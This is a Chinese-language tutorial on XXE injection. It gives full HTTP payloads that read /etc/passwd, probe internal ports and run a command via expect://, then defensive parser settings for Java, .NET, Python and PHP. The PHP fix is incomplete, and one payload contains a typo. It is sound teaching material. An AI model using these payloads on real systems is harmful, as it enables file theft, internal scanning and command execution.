# XXE漏洞

## 1、概述

XXE（XML External Entity injection）XML外部实体注入漏洞。

XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，造成**任意文件读取、命令执行、SSRF**等危害。

- 分类：Web通用漏洞
- 风险等级：高危

## 2、漏洞原理

若网站支持XML-RPC（XML Remote Procedure Call），用户提交的数据格式如下：

```http
POST /xxe HTTP/1.1
Host: aaa.com
Content-Type: text/xml
<?xml version="1.0"?>
<student>
<username>xxx</username>
<password>yyy</password>
<address>zzz</address>
</student>
```

攻击者可以通过插入DTD标签读取文件：

- 读取etc/passwd

```http
POST /xxe HTTP/1.1
Host: aaa.com
Content-Type: text/xml
<?xml version="1.0"?>
<!DOCTYPE ANY [<!ENTITY f SYSTEM "file:///etc/passwd">]>
<student>
<username>xxx</username>
<password>yyy</password>
<address>zzz</address>
</student>
```

- 探测端口

```http
POST /xxe HTTP/1.1
Host: aaa.com
Content-Type: text/xml
<?xml version="1.0"?>
<!DOCTYPE GVI [<!ENTITY xxe SYSTEM "http://127.0.0.1:8080">]>
<student>
<username>xxx</username>
<password>yyy</password>
<address>zzz</address>
</student>
```

- 执行命令

```http
POST /xxe HTTP/1.1
Host: aaa.com
Content-Type: text/xml
<?xml version="1.0"?>
<!DOCTYPE GVI [<!ELEMENT foo ANT><!ENTITY xxe SYSTEM "expect://id">]>
<student>
<username>xxx</username>
<password>yyy</password>
<address>zzz</address>
</student>
```

## 3、漏洞挖掘

遇到提交数据为XML格式时，尝试使用DTD标签引入文件读取并观察回显。对于无回显的可以用盲打技术。

## 4、漏洞防御

1. 及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库；
2. 使用[开发语言提供的禁用外部实体](#批注1)的方法：`https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Prevention_Cheat_Sheet`

## 5、实验

对应实验9

## 6、批注

<a name="批注1">禁用外部实体</a> ：

Java

在使用Java处理XML时，禁用外部实体的方式可以是在解析XML前设置一个特殊的属性：

```java
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

 .NET (C#)

在.NET中，可以通过设置XmlReaderSettings类中的属性来禁用外部实体：

```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.XmlResolver = null;
```

Python (lxml)

使用Python的lxml库解析XML时，可以通过禁用外部实体来防止XXE攻击：

```python
from lxml import etree

parser = etree.XMLParser(resolve_entities=False)
```

PHP

在PHP中，可以通过禁用实体解析来防止XXE攻击：

```php
$doc = new DOMDocument();
$doc->loadXML($xml, LIBXML_NONET);
```

这些代码片段提供了各种语言中防止XXE攻击的方法示例。注意，XXE防护方法可能因语言和框架的不同而异，使用时请查阅官方文档或特定语言的安全最佳实践。